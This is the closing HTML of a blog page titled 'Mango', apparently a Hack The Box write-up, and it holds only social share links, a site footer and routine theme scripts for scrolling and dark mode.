aria-label="share Mango on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f&title=Mango"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Mango on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Mango on whatsapp" href="https://api.whatsapp.com/send?text=Mango%20-%20https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Mango on telegram" href="https://telegram.me/share/url?text=Mango&url=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://TMDeal.github.io>TMDeal</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>